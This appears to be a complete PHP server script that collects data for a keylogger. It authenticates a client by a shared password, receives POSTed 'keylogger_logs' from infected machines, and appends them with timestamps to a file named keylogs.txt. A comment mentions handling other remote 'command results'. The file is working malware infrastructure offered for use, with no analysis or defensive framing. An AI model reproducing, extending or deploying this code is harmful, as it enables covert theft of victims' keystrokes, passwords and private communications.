<?php
// Configuration
$PASSWORD = "CHANGE_ME"; // Must match the client password
$LOG_FILE = "keylogs.txt";

// Get parameters
$action = isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : '');
$pass = isset($_POST['password']) ? $_POST['password'] : (isset($_GET['password']) ? $_GET['password'] : '');

// Verify password
if ($pass !== $PASSWORD) {
    die("Access Denied");
}

// Handle actions
if ($action == 'add_result') {
    $command = isset($_POST['command']) ? $_POST['command'] : '';
    $result = isset($_POST['result']) ? $_POST['result'] : '';
    
    if ($command == 'keylogger_logs' && !empty($result)) {
        // Append logs to file
        $timestamp = date("Y-m-d H:i:s");
        $entry = "=== LOG RECEIVED AT $timestamp ===\n" . $result . "\n\n";
        
        if (file_put_contents($LOG_FILE, $entry, FILE_APPEND)) {
            echo "Logs saved successfully";
        } else {
            http_response_code(500);
            echo "Error saving logs";
        }
    } else {
        // Handle other command results (existing functionality)
        // You can extend this to save other command outputs to different files if needed
        echo "Result received";
    }
} else {
    echo "Invalid action";
}
?>
